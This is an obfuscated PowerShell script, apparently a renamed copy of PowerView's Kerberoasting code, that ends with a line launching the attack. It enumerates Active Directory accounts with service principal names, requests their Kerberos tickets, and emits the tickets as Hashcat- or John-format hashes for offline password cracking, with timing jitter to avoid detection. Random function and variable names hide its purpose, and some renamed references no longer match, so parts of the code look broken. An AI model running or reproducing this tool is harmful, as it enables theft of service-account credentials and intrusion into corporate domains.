function caste {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ylhTfqmk99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $tHhCSxoK99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $AGgFShaP99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $uUMMfqqO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $mfmrqVYz99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $SlfVLwoO99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $rbsDXjCk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $XSPtFzOT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ZdkhOZvC99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $vXTwxnMm99,
        [Switch]
        $UrGkwRxG99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $BWKBAHGp99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $bDiOdsic99 = $ylhTfqmk99
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $kfxNRObU99 = lapels -Credential $BWKBAHGp99
            }
            else {
                $kfxNRObU99 = lapels
            }
            $bDiOdsic99 = $kfxNRObU99.Name
        }
        if (-not $PSBoundParameters['Server']) {
            try {
                if ($kfxNRObU99) {
                    $nlqoaPcB99 = $kfxNRObU99.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $nlqoaPcB99 = ((lapels -Credential $BWKBAHGp99).PdcRoleOwner).Name
                }
                else {
                    $nlqoaPcB99 = ((lapels).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[caste] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $nlqoaPcB99 = $SlfVLwoO99
        }
        $GDkyMAiX99 = 'LDAP://'
        if ($nlqoaPcB99 -and ($nlqoaPcB99.Trim() -ne '')) {
            $GDkyMAiX99 += $nlqoaPcB99
            if ($bDiOdsic99) {
                $GDkyMAiX99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $GDkyMAiX99 += $mfmrqVYz99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($uUMMfqqO99 -Match '^GC://') {
                $DN = $uUMMfqqO99.ToUpper().Trim('/')
                $GDkyMAiX99 = ''
            }
            else {
                if ($uUMMfqqO99 -match '^LDAP://') {
                    if ($uUMMfqqO99 -match "LDAP://.+/.+") {
                        $GDkyMAiX99 = ''
                        $DN = $uUMMfqqO99
                    }
                    else {
                        $DN = $uUMMfqqO99.SubString(7)
                    }
                }
                else {
                    $DN = $uUMMfqqO99
                }
            }
        }
        else {
            if ($bDiOdsic99 -and ($bDiOdsic99.Trim() -ne '')) {
                $DN = "DC=$($bDiOdsic99.Replace('.', ',DC='))"
            }
        }
        $GDkyMAiX99 += $DN
        Write-Verbose "[caste] search string: $GDkyMAiX99"
        if ($BWKBAHGp99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[caste] Using alternate credentials for LDAP connection"
            $kfxNRObU99 = New-Object DirectoryServices.DirectoryEntry($GDkyMAiX99, $BWKBAHGp99.UserName, $BWKBAHGp99.GetNetworkCredential().Password)
            $EylSkCej99 = New-Object System.DirectoryServices.DirectorySearcher($kfxNRObU99)
        }
        else {
            $EylSkCej99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$GDkyMAiX99)
        }
        $EylSkCej99.PageSize = $XSPtFzOT99
        $EylSkCej99.SearchScope = $rbsDXjCk99
        $EylSkCej99.CacheResults = $False
        $EylSkCej99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $EylSkCej99.ServerTimeLimit = $ZdkhOZvC99
        }
        if ($PSBoundParameters['Tombstone']) {
            $EylSkCej99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $EylSkCej99.filter = $tHhCSxoK99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $EylSkCej99.SecurityMasks = Switch ($vXTwxnMm99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $jtUhiPcx99 = $AGgFShaP99| ForEach-Object { $_.Split(',') }
            $Null = $EylSkCej99.PropertiesToLoad.AddRange(($jtUhiPcx99))
        }
        $EylSkCej99
    }
}
function revalues {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $AGgFShaP99
    )
    $mZOsVrFZ99 = @{}
    $AGgFShaP99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $mZOsVrFZ99[$_] = $AGgFShaP99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $mZOsVrFZ99[$_] = $AGgFShaP99[$_][0] -as $eQWwsDpL99
            }
            elseif ($_ -eq 'samaccounttype') {
                $mZOsVrFZ99[$_] = $AGgFShaP99[$_][0] -as $aZXWDVUR99
            }
            elseif ($_ -eq 'objectguid') {
                $mZOsVrFZ99[$_] = (New-Object Guid (,$AGgFShaP99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $mZOsVrFZ99[$_] = $AGgFShaP99[$_][0] -as $WdDTGsod99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $hdMNIzCU99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $AGgFShaP99[$_][0], 0
                if ($hdMNIzCU99.Owner) {
                    $mZOsVrFZ99['Owner'] = $hdMNIzCU99.Owner
                }
                if ($hdMNIzCU99.Group) {
                    $mZOsVrFZ99['Group'] = $hdMNIzCU99.Group
                }
                if ($hdMNIzCU99.DiscretionaryAcl) {
                    $mZOsVrFZ99['DiscretionaryAcl'] = $hdMNIzCU99.DiscretionaryAcl
                }
                if ($hdMNIzCU99.SystemAcl) {
                    $mZOsVrFZ99['SystemAcl'] = $hdMNIzCU99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($AGgFShaP99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $mZOsVrFZ99[$_] = "NEVER"
                }
                else {
                    $mZOsVrFZ99[$_] = [datetime]::fromfiletime($AGgFShaP99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($AGgFShaP99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $AGgFShaP99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $mZOsVrFZ99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $mZOsVrFZ99[$_] = ([datetime]::FromFileTime(($AGgFShaP99[$_][0])))
                }
            }
            elseif ($AGgFShaP99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $AGgFShaP99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $mZOsVrFZ99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[revalues] error: $_"
                    $mZOsVrFZ99[$_] = $Prop[$_]
                }
            }
            elseif ($AGgFShaP99[$_].count -eq 1) {
                $mZOsVrFZ99[$_] = $AGgFShaP99[$_][0]
            }
            else {
                $mZOsVrFZ99[$_] = $AGgFShaP99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $mZOsVrFZ99
    }
    catch {
        Write-Warning "[revalues] Error parsing LDAP properties : $_"
    }
}
function lapels {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ylhTfqmk99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $BWKBAHGp99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[lapels] Using alternate credentials for lapels'
            if ($PSBoundParameters['Domain']) {
                $bDiOdsic99 = $ylhTfqmk99
            }
            else {
                $bDiOdsic99 = $BWKBAHGp99.GetNetworkCredential().Domain
                Write-Verbose "[lapels] Extracted domain '$bDiOdsic99' from -Credential"
            }
            $eplINJxx99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $bDiOdsic99, $BWKBAHGp99.UserName, $BWKBAHGp99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($eplINJxx99)
            }
            catch {
                Write-Verbose "[lapels] The specified domain '$bDiOdsic99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $eplINJxx99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $ylhTfqmk99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($eplINJxx99)
            }
            catch {
                Write-Verbose "[lapels] The specified domain '$ylhTfqmk99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[lapels] Error retrieving the current domain: $_"
            }
        }
    }
}
function plummeted {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $ctBQUBZZ99 = 'John',
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $dMyboiHK99 = .3,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $BWKBAHGp99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $rofjMFdO99 = Invoke-UserImpersonation -Credential $BWKBAHGp99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $FnZvLcaM99 = $User
        }
        else {
            $FnZvLcaM99 = $SPN
        }
	
	$IfAkpdSA99 = New-Object System.Random
        ForEach ($Object in $FnZvLcaM99) {
            if ($PSBoundParameters['User']) {
                $WPcAbzfH99 = $Object.ServicePrincipalName
                $fgfDcfRm99 = $Object.SamAccountName
                $BpsNqtfr99 = $Object.DistinguishedName
            }
            else {
                $WPcAbzfH99 = $Object
                $fgfDcfRm99 = 'UNKNOWN'
                $BpsNqtfr99 = 'UNKNOWN'
            }
            if ($WPcAbzfH99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $WPcAbzfH99 = $WPcAbzfH99[0]
            }
            try {
                $KLpXwocC99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $WPcAbzfH99
            }
            catch {
                Write-Warning "[plummeted] Error requesting ticket for SPN '$WPcAbzfH99' from user '$BpsNqtfr99' : $_"
            }
            if ($KLpXwocC99) {
                $gGwweUjZ99 = $KLpXwocC99.GetRequest()
            }
            if ($gGwweUjZ99) {
                $Out = New-Object PSObject
                $rQJMNdOp99 = [System.BitConverter]::ToString($gGwweUjZ99) -replace '-'
                if($rQJMNdOp99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $KNlynZde99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $ceJyzuqm99 = $Matches.DataToEnd.Substring(0,$KNlynZde99*2)
                    if($Matches.DataToEnd.Substring($KNlynZde99*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($KLpXwocC99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($gGwweUjZ99).Replace('-',''))
                    } else {
                        $Hash = "$($ceJyzuqm99.Substring(0,32))`$$($ceJyzuqm99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($KLpXwocC99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($gGwweUjZ99).Replace('-',''))
                }
                if($Hash) {
                    if ($ctBQUBZZ99 -match 'John') {
                        $anSFchfR99 = "`$YxCubMvO99`$$($KLpXwocC99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($BpsNqtfr99 -ne 'UNKNOWN') {
                            $mTKguehI99 = $BpsNqtfr99.SubString($BpsNqtfr99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $mTKguehI99 = 'UNKNOWN'
                        }
                        $anSFchfR99 = "`$YxCubMvO99`$$($Etype)`$*$fgfDcfRm99`$$mTKguehI99`$$($KLpXwocC99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $anSFchfR99
                }
                $Out | Add-Member Noteproperty 'SamAccountName' $fgfDcfRm99
                $Out | Add-Member Noteproperty 'DistinguishedName' $BpsNqtfr99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $KLpXwocC99.ServicePrincipalName
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                Write-Output $Out
            }
            Start-Sleep -Seconds $IfAkpdSA99.Next((1-$dMyboiHK99)*$Delay, (1+$dMyboiHK99)*$Delay)
        }
    }
    END {
        if ($rofjMFdO99) {
            Invoke-RevertToSelf -TokenHandle $rofjMFdO99
        }
    }
}
function paradigm {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $ldeRSvRu99,
        [Switch]
        $SPN,
        [Switch]
        $oDZgngMQ99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $gBgwQNLY99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $QEOSMhMM99,
        [Switch]
        $LgYJZaOT99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $tlhlnyxL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ylhTfqmk99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $tHhCSxoK99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $AGgFShaP99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $uUMMfqqO99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $SlfVLwoO99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $rbsDXjCk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $XSPtFzOT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ZdkhOZvC99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $vXTwxnMm99,
        [Switch]
        $UrGkwRxG99,
        [Alias('ReturnOne')]
        [Switch]
        $xtDKsxtS99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $BWKBAHGp99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $PYbJuCSP99 = @{}
        if ($PSBoundParameters['Domain']) { $PYbJuCSP99['Domain'] = $ylhTfqmk99 }
        if ($PSBoundParameters['Properties']) { $PYbJuCSP99['Properties'] = $AGgFShaP99 }
        if ($PSBoundParameters['SearchBase']) { $PYbJuCSP99['SearchBase'] = $uUMMfqqO99 }
        if ($PSBoundParameters['Server']) { $PYbJuCSP99['Server'] = $SlfVLwoO99 }
        if ($PSBoundParameters['SearchScope']) { $PYbJuCSP99['SearchScope'] = $rbsDXjCk99 }
        if ($PSBoundParameters['ResultPageSize']) { $PYbJuCSP99['ResultPageSize'] = $XSPtFzOT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PYbJuCSP99['ServerTimeLimit'] = $ZdkhOZvC99 }
        if ($PSBoundParameters['SecurityMasks']) { $PYbJuCSP99['SecurityMasks'] = $vXTwxnMm99 }
        if ($PSBoundParameters['Tombstone']) { $PYbJuCSP99['Tombstone'] = $UrGkwRxG99 }
        if ($PSBoundParameters['Credential']) { $PYbJuCSP99['Credential'] = $BWKBAHGp99 }
        $bmomvGIb99 = caste @SearcherArguments
    }
    PROCESS {
        if ($bmomvGIb99) {
            $cnEZQNyQ99 = ''
            $WOyKVFZh99 = ''
            $ldeRSvRu99 | Where-Object {$_} | ForEach-Object {
                $ZOsjPLNt99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($ZOsjPLNt99 -match '^S-1-') {
                    $cnEZQNyQ99 += "(objectsid=$ZOsjPLNt99)"
                }
                elseif ($ZOsjPLNt99 -match '^CN=') {
                    $cnEZQNyQ99 += "(distinguishedname=$ZOsjPLNt99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $NwYZyppr99 = $ZOsjPLNt99.SubString($ZOsjPLNt99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[paradigm] Extracted domain '$NwYZyppr99' from '$ZOsjPLNt99'"
                        $PYbJuCSP99['Domain'] = $NwYZyppr99
                        $bmomvGIb99 = caste @SearcherArguments
                        if (-not $bmomvGIb99) {
                            Write-Warning "[paradigm] Unable to retrieve domain searcher for '$NwYZyppr99'"
                        }
                    }
                }
                elseif ($ZOsjPLNt99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $JtoojwZi99 = (([Guid]$ZOsjPLNt99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $cnEZQNyQ99 += "(objectguid=$JtoojwZi99)"
                }
                elseif ($ZOsjPLNt99.Contains('\')) {
                    $wcTKVjgP99 = $ZOsjPLNt99.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($wcTKVjgP99) {
                        $mTKguehI99 = $wcTKVjgP99.SubString(0, $wcTKVjgP99.IndexOf('/'))
                        $UTvXKZnL99 = $ZOsjPLNt99.Split('\')[1]
                        $cnEZQNyQ99 += "(samAccountName=$UTvXKZnL99)"
                        $PYbJuCSP99['Domain'] = $mTKguehI99
                        Write-Verbose "[paradigm] Extracted domain '$mTKguehI99' from '$ZOsjPLNt99'"
                        $bmomvGIb99 = caste @SearcherArguments
                    }
                }
                else {
                    $cnEZQNyQ99 += "(samAccountName=$ZOsjPLNt99)"
                }
            }
            if ($cnEZQNyQ99 -and ($cnEZQNyQ99.Trim() -ne '') ) {
                $WOyKVFZh99 += "(|$cnEZQNyQ99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[paradigm] Searching for non-null service principal names'
                $WOyKVFZh99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[paradigm] Searching for users who can be delegated'
                $WOyKVFZh99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[paradigm] Searching for users who are sensitive and not trusted for delegation'
                $WOyKVFZh99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[paradigm] Searching for adminCount=1'
                $WOyKVFZh99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[paradigm] Searching for users that are trusted to authenticate for other principals'
                $WOyKVFZh99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[paradigm] Searching for user accounts that do not require kerberos preauthenticate'
                $WOyKVFZh99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[paradigm] Using additional LDAP filter: $tHhCSxoK99"
                $WOyKVFZh99 += "$tHhCSxoK99"
            }
            $tJmVEECo99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $NcmsYUYx99 = $_.Substring(4)
                    $nWZyTeEX99 = [Int]($WdDTGsod99::$NcmsYUYx99)
                    $WOyKVFZh99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$nWZyTeEX99))"
                }
                else {
                    $nWZyTeEX99 = [Int]($WdDTGsod99::$_)
                    $WOyKVFZh99 += "(userAccountControl:1.2.840.113556.1.4.803:=$nWZyTeEX99)"
                }
            }
            $bmomvGIb99.filter = "(&(samAccountType=805306368)$WOyKVFZh99)"
            Write-Verbose "[paradigm] filter string: $($bmomvGIb99.filter)"
            if ($PSBoundParameters['FindOne']) { $dbIrbFZw99 = $bmomvGIb99.FindOne() }
            else { $dbIrbFZw99 = $bmomvGIb99.FindAll() }
            $dbIrbFZw99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = revalues -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($dbIrbFZw99) {
                try { $dbIrbFZw99.dispose() }
                catch {
                    Write-Verbose "[paradigm] Error disposing of the Results object: $_"
                }
            }
            $bmomvGIb99.dispose()
        }
    }
}
function f {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $ldeRSvRu99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ylhTfqmk99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $tHhCSxoK99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $uUMMfqqO99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $SlfVLwoO99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $rbsDXjCk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $XSPtFzOT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ZdkhOZvC99,
        [Switch]
        $UrGkwRxG99,
        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $dMyboiHK99 = .3,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $ctBQUBZZ99 = 'John',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $BWKBAHGp99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $pLhaFwJJ99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $pLhaFwJJ99['Domain'] = $ylhTfqmk99 }
        if ($PSBoundParameters['LDAPFilter']) { $pLhaFwJJ99['LDAPFilter'] = $tHhCSxoK99 }
        if ($PSBoundParameters['SearchBase']) { $pLhaFwJJ99['SearchBase'] = $uUMMfqqO99 }
        if ($PSBoundParameters['Server']) { $pLhaFwJJ99['Server'] = $SlfVLwoO99 }
        if ($PSBoundParameters['SearchScope']) { $pLhaFwJJ99['SearchScope'] = $rbsDXjCk99 }
        if ($PSBoundParameters['ResultPageSize']) { $pLhaFwJJ99['ResultPageSize'] = $XSPtFzOT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $pLhaFwJJ99['ServerTimeLimit'] = $ZdkhOZvC99 }
        if ($PSBoundParameters['Tombstone']) { $pLhaFwJJ99['Tombstone'] = $UrGkwRxG99 }
        if ($PSBoundParameters['Credential']) { $pLhaFwJJ99['Credential'] = $BWKBAHGp99 }
        if ($PSBoundParameters['Credential']) {
            $rofjMFdO99 = Invoke-UserImpersonation -Credential $BWKBAHGp99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $pLhaFwJJ99['Identity'] = $ldeRSvRu99 }
        paradigm @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | plummeted -Delay $Delay -OutputFormat $ctBQUBZZ99 -Jitter $dMyboiHK99
    }
    END {
        if ($rofjMFdO99) {
            Invoke-RevertToSelf -TokenHandle $rofjMFdO99
        }
    }
}
f -OutputFormat Hashcat
